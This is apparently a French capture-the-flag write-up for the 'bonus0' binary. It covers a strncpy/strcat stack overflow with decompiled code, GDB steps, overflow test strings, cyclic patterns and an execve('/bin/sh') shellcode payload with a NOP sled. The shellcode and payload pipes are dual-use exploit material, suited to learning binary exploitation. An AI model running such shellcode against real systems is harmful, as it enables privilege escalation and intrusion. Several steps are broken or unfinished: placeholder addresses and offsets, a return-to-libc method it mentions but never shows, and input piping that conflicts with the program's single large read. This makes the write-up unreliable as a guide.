# BONUS 0

## 1. Introduction

Le binaire `bonus0` présente une vulnérabilité de **buffer overflow** via concaténation de chaînes. Le programme lit deux entrées de 20 caractères maximum, les concatène avec un espace, puis affiche le résultat dans un buffer de 54 caractères.

## 2. Analyse

### 2.1 Droits du binaire
```bash
$ ls -la bonus0
-rwsr-s---+ 1 bonus1  bonus0  747441 Mar  6  2016 bonus0
```

### 2.2 Code source analysé

```c
void main(void) {
    char local_3a[54];  // Buffer de 54 octets
    pp(local_3a);
    puts(local_3a);
    return 0;
}

void pp(char *param_1) {
    char local_34[20];  // Premier buffer
    char local_20[20];  // Second buffer
    
    p(local_34, &DAT_080486a0);        // Lit première entrée
    p(local_20, &DAT_080486a0);        // Lit seconde entrée
    strcpy(param_1, local_34);         // Copie première entrée
    
    // Calcule la longueur et ajoute un espace
    strlen_result = strlen(param_1);
    param_1[strlen_result] = ' ';
    param_1[strlen_result + 1] = '\0';
    
    strcat(param_1, local_20);         // Concatène seconde entrée
    return;
}

void p(char *param_1, char *param_2) {
    char local_100c[4104];
    
    puts(param_2);
    read(0, local_100c, 0x1000);
    pcVar1 = strchr(local_100c, 10);   // Trouve newline
    *pcVar1 = '\0';                    // Remplace par null
    strncpy(param_1, local_100c, 0x14); // Copie EXACTEMENT 20 octets
    return;
}
```

## 3. Analyse PRÉCISE de la vulnérabilité

### 3.1 Problème 1 : Echo ajoute un newline

Quand vous faites `echo "AAAAAAAAAAAAAAAAAAAA"`, cela produit **21 caractères** (20 'A' + newline).

### 3.2 Problème 2 : Comportement de strncpy()

- `strncpy(param_1, local_100c, 0x14)` copie **EXACTEMENT 20 octets**
- Si la source fait **20 caractères ou plus**, aucun '\0' n'est ajouté
- Les 20 premiers caractères sont copiés, le newline est ignoré

### 3.3 Problème 3 : strlen() sur buffer non-terminé

Si `local_34` n'a pas de '\0' à la fin :
- `strlen(param_1)` va lire **au-delà** des 20 caractères
- Il cherche un '\0' dans les données suivantes sur la pile
- L'espace est ajouté à une position imprévisible

## 4. Exploitation CORRIGÉE

### 4.1 Étape 1 : Comprendre la layout de la pile

D'après le code source Ghidra, la pile dans `pp()` est :
```
┌─────────────────┐ ← ESP+44 (local_34[20])
│   Entrée 1      │
├─────────────────┤ ← ESP+24 (local_20[20]) 
│   Entrée 2      │
├─────────────────┤ ← ESP+0
│  Autres vars    │
└─────────────────┘
```

### 4.2 Étape 2 : Stratégie correcte

**Option A : Contrôler strlen()**
- Entrée 1 : 19 'A' (avec null terminator automatique)
- Entrée 2 : payload d'overflow

**Option B : Buffer adjacents**
- Si `local_34` et `local_20` sont adjacents, contrôler les deux

### 4.3 Étape 3 : Test de la layout mémoire

```bash
# Test 1 : Vérifier si les buffers sont adjacents
./bonus0
AAAAAAAAAAAAAAAAAAA\x00  # 19 'A' + null explicite
BBBBBBBBBBBBBBBBBBBB     # 20 'B'

# Observer si on obtient : "AAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBB"
```

### 4.4 Étape 4 : Exploitation avec buffers adjacents

Si les buffers sont adjacents dans la pile :

```bash
# Test d'overflow contrôlé
(printf "AAAAAAAAAAAAAAAAAAA\x00"; printf "BBBBBBBBBBBBBBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLL") | ./bonus0
```

### 4.5 Étape 5 : Méthode alternative - Return to shellcode

Si return to libc ne fonctionne pas, utiliser shellcode sur la pile :

```bash
# Shellcode minimal (23 octets)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Payload avec NOP sled
(printf "AAAAAAAAAAAAAAAAAAA\x00"; python -c 'print "\x90"*10 + shellcode + "A"*(OFFSET-33) + "\xADDR_STACK"') | ./bonus0
```

## 5. Méthode de débogage systématique

### 5.1 Étape 1 : Tester les entrées séparément

```bash
# Test longueur première entrée
gdb bonus0
(gdb) break pp
(gdb) run
# Entrer : AAAAAAAAAAAAAAAAAAA (19 'A')
# Entrer : BBBB
(gdb) x/60x $esp
(gdb) x/s $esp+44  # local_34
(gdb) x/s $esp+24  # local_20
```

### 5.2 Étape 2 : Analyser le comportement de strlen

```bash
# Dans GDB après strcpy()
(gdb) break *pp+XX  # Après strcpy, avant strlen
(gdb) x/s param_1
(gdb) call strlen(param_1)
```

### 5.3 Étape 3 : Identifier la position exacte de l'overflow

```bash
# Utiliser printf au lieu d'echo pour contrôler exactement
(printf "AAAAAAAAAAAAAAAAAAA\x00"; printf "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9") | ./bonus0

# Dans GDB, examiner EIP après segfault
```

## 6. Commandes de test

### 6.1 Test de base (sans echo)

```bash
# Méthode 1 : printf pour contrôle exact
(printf "AAAAAAAAAAAAAAAAAAA\x00"; printf "BBBBBBBBBBBBBBBBBBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP") | ./bonus0

# Méthode 2 : python pour contrôle total
(python -c 'print "A"*19'; python -c 'print "B"*20 + "C"*20 + "D"*20') | ./bonus0
```

### 6.2 Vérification de l'offset réel

```bash
# Créer un pattern précis
(python -c 'print "A"*19'; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"') | ./bonus0

# Dans GDB, examiner EIP et calculer l'offset précis
```

## 7. Action immediate

**Testez d'abord ceci pour comprendre la layout :**

```bash
(printf "AAAAAAAAAAAAAAAAAAA\x00"; printf "BBBBBBBBBBBBBBBBBBBB") | ./bonus0
```

**Puis ceci pour voir l'overflow :**

```bash
(printf "AAAAAAAAAAAAAAAAAAA\x00"; printf "BBBBBBBBBBBBBBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLL") | ./bonus0
```

**Analysez l'output pour comprendre EXACTEMENT comment les données sont concaténées.**

## 8. Conclusion

L'erreur principale était l'utilisation d'`echo` qui ajoute un newline, perturbant strncpy(). 